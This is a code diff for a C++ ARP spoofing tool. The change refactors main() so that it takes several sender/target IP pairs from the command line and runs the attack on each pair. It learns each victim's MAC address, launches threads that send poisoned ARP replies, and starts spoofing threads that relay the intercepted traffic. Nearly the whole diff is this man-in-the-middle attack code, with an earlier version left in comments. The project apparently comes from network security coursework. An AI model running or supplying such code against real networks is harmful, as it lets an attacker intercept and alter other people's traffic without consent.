@@ -10,6 +10,7 @@
 #include <csignal>
 
 #include <queue>
+#include <map>
 
 #define PACKET_SLEEP_INTERVAL 5
 #define PACKET_INFECT_INTERVAL 60
@@ -53,6 +54,7 @@ int main(int argc, char const *argv[])
         usage();
         return -1;
     }
+    int schedule = (argc - 2) / 2;
 
     Mac attackerMac;
     Ip attackerIp;
@@ -68,118 +70,91 @@ int main(int argc, char const *argv[])
         return -1;
     }
 
-    Ip senderIp = Ip(const_cast<char *>(argv[2]));
-    Ip targetIp = Ip(const_cast<char *>(argv[2 + 1]));
+    // Ip senderIp = Ip(const_cast<char *>(argv[2]));
+    // Ip targetIp = Ip(const_cast<char *>(argv[2 + 1]));
 
-    int received[2];
+    int received[schedule];
 
-    pthread_t bc_threads[2];
-    pthread_t inf_threads[2];
-    pthread_t spoof_threads[2];
+    pthread_t bc_threads[schedule];
+    pthread_t inf_threads[schedule];
+    pthread_t spoof_threads[schedule];
     pthread_t producer;
 
-    pthread_mutex_t pipe_m[2];
-    pthread_cond_t pipe_c[2];
+    pthread_mutex_t pipe_m[schedule];
+    pthread_cond_t pipe_c[schedule];
 
     pthread_attr_t attr;
     if (int err = pthread_attr_init(&attr))
         fprintf(stderr, "couldn't pthread_attr_init error with %d\n", err);
     pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
 
-    // ------declartion done
+    std::queue<Ip> args;
+    std::map<Ip, Mac> table;
 
-    EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
-    SendArpParam p = {&received[0], bc_pkt};
-    printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
-    if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &p) != 0)
-        printf("thread A create fail : %d\n", err);
+    for (int i = 2; i < argc; i += 2)
+    {
+        args.push(Ip(const_cast<char *>(argv[i])));
+        args.push(Ip(const_cast<char *>(argv[i + 1])));
+    }
 
-    Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
-    printf("sender mac address get : %s\n", std::string(senderMac).c_str());
+    for (int i = 0; i < schedule; i++)
+    {
+        Ip senderIp = args.front();
+        args.pop();
+        Ip targetIp = args.front();
+        args.pop();
 
-    EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
-    if (int err = pthread_create(&inf_threads[0], &attr, threadInfect, &inf_pkt) != 0)
-        printf("thread A create fail : %d\n", err);
-    printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
+        Mac senderMac;
 
-    //---- sender <-> target exact
+        EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
+        SendArpParam p = {&received[i], bc_pkt};
+        printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
+        if (int err = pthread_create(&bc_threads[i], &attr, threadSendArp, &p) != 0)
+            printf("thread A create fail : %d\n", err);
 
-    EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
-    SendArpParam p1 = {&received[1], bc_pkt1};
-    printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
-    if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp, &p1) != 0)
-        printf("thread A create fail : %d\n", err);
+        senderMac = receiveArpReply(handle, senderIp, &received[i]);
+        table.insert({senderIp, senderMac});
+        printf("sender mac address get : %s\n", std::string(senderMac).c_str());
 
-    Mac targetMac = receiveArpReply(handle, targetIp, &received[1]);
-    printf("target mac address get : %s\n", std::string(targetMac).c_str());
+        EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
+        if (int err = pthread_create(&inf_threads[i], &attr, threadInfect, &inf_pkt) != 0)
+            printf("thread A create fail : %d\n", err);
+        printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
 
-    EthArpPacket inf_pkt1 = EthArpPacket::infectPacket(attackerMac, targetMac, targetIp, senderIp);
-    if (int err = pthread_create(&inf_threads[1], &attr, threadInfect, &inf_pkt1) != 0)
-        printf("thread A create fail : %d\n", err);
-    printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());
+        args.push(senderIp);
+        args.push(targetIp);
+    }
 
-    //-----
+    for (int i = 0; i < schedule; i++)
+    {
+        Ip senderIp = args.front();
+        args.pop();
+        Ip targetIp = args.front();
+        args.pop();
+        Mac senderMac = table.at(senderIp);
+        Mac targetMac = table.at(targetIp);
 
-    // pcap sniff start
+        pthread_mutex_init(&pipe_m[i], NULL);
+        pthread_cond_init(&pipe_c[i], NULL);
+        registerMac(senderMac, &pipe_c[i], &pipe_m[i]);
+
+        SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
+        if (int err = pthread_create(&spoof_threads[i], &attr, spoof, &sp) != 0)
+            printf("thread e create fail : %d\n", err);
+        printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
+    }
+
     ProduceParam pparam = {handle, attackerMac};
     if (int err = pthread_create(&producer, NULL, producePacket, &pparam) != 0)
         printf("thread producer fail : %d\n", err);
     printf("producer thread start\n");
 
-    pthread_mutex_init(&pipe_m[0], NULL);
-    pthread_cond_init(&pipe_c[0], NULL);
-    registerMac(senderMac, &pipe_c[0], &pipe_m[0]);
-
-    pthread_mutex_init(&pipe_m[1], NULL);
-    pthread_cond_init(&pipe_c[1], NULL);
-    registerMac(targetMac, &pipe_c[1], &pipe_m[1]);
-
-    SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
-    if (int err = pthread_create(&spoof_threads[0], &attr, spoof, &sp) != 0)
-        printf("thread e create fail : %d\n", err);
-    printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
-
-    // sender <-> target exact
-
-    SpoofParams sp2 = {handle, attackerMac, targetMac, senderMac};
-    if (int err = pthread_create(&spoof_threads[1], &attr, spoof, &sp2) != 0)
-        printf("thread f create fail : %d\n", err);
-    printf("spoofing %s -> %s\n", std::string(targetIp).c_str(), std::string(senderIp).c_str());
-
     signal(SIGINT, NULL);
-    // temp
     while (true)
     {
         printf("main thread...\n");
         sleep(10);
     }
-
-    // std::queue<Ip> args;
-    // for (int i = 2; i < argc; i += 2)
-    // {
-    //     Ip senderIp = Ip(const_cast<char *>(argv[i]));
-    //     Ip targetIp = Ip(const_cast<char *>(argv[i + 1]));
-    //     args.push(senderIp);
-    //     args.push(targetIp);
-    // }
-
-    // int schedule = (argc - 2) / 2;
-    // for (int i = 0; i < schedule; i++)
-    // {
-    //     EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
-    //     SendArpParam p = {&received[i], bc_pkt};
-    //     printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
-    //     if (int err = pthread_create(&bc_threads[i], &attr, threadSendArp, &p) != 0)
-    //         printf("thread A create fail : %d\n", err);
-
-    //     Mac senderMac = receiveArpReply(handle, senderIp, &received[i]);
-    //     printf("sender mac address get : %s\n", std::string(senderMac).c_str());
-
-    //     EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
-    //     if (int err = pthread_create(&inf_threads[i], &attr, threadInfect, &inf_pkt) != 0)
-    //         printf("thread A create fail : %d\n", err);
-    //     printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
-    // }
 
     return 0;
 }
@@ -207,8 +182,9 @@ int main(int argc, char const *argv[])
 // };
 
 // EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
+// SendArpParam p = {&received[0], bc_pkt};
 // printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
-// if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &bc_pkt) != 0)
+// if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &p) != 0)
 //     printf("thread A create fail : %d\n", err);
 
 // Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
@@ -218,3 +194,52 @@ int main(int argc, char const *argv[])
 // if (int err = pthread_create(&inf_threads[0], &attr, threadInfect, &inf_pkt) != 0)
 //     printf("thread A create fail : %d\n", err);
 // printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
+
+// EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
+// SendArpParam p1 = {&received[1], bc_pkt1};
+// printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
+// if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp, &p1) != 0)
+//     printf("thread A create fail : %d\n", err);
+
+// Mac targetMac = receiveArpReply(handle, targetIp, &received[1]);
+// printf("target mac address get : %s\n", std::string(targetMac).c_str());
+
+// EthArpPacket inf_pkt1 = EthArpPacket::infectPacket(attackerMac, targetMac, targetIp, senderIp);
+// if (int err = pthread_create(&inf_threads[1], &attr, threadInfect, &inf_pkt1) != 0)
+//     printf("thread A create fail : %d\n", err);
+// printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());
+
+// //-----
+
+// ProduceParam pparam = {handle, attackerMac};
+// if (int err = pthread_create(&producer, NULL, producePacket, &pparam) != 0)
+//     printf("thread producer fail : %d\n", err);
+// printf("producer thread start\n");
+
+// pthread_mutex_init(&pipe_m[0], NULL);
+// pthread_cond_init(&pipe_c[0], NULL);
+// registerMac(senderMac, &pipe_c[0], &pipe_m[0]);
+
+// pthread_mutex_init(&pipe_m[1], NULL);
+// pthread_cond_init(&pipe_c[1], NULL);
+// registerMac(targetMac, &pipe_c[1], &pipe_m[1]);
+
+// SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
+// if (int err = pthread_create(&spoof_threads[0], &attr, spoof, &sp) != 0)
+//     printf("thread e create fail : %d\n", err);
+// printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
+
+// // sender <-> target exact
+
+// SpoofParams sp2 = {handle, attackerMac, targetMac, senderMac};
+// if (int err = pthread_create(&spoof_threads[1], &attr, spoof, &sp2) != 0)
+//     printf("thread f create fail : %d\n", err);
+// printf("spoofing %s -> %s\n", std::string(targetIp).c_str(), std::string(senderIp).c_str());
+
+// signal(SIGINT, NULL);
+// // temp
+// while (true)
+// {
+//     printf("main thread...\n");
+//     sleep(10);
+// }
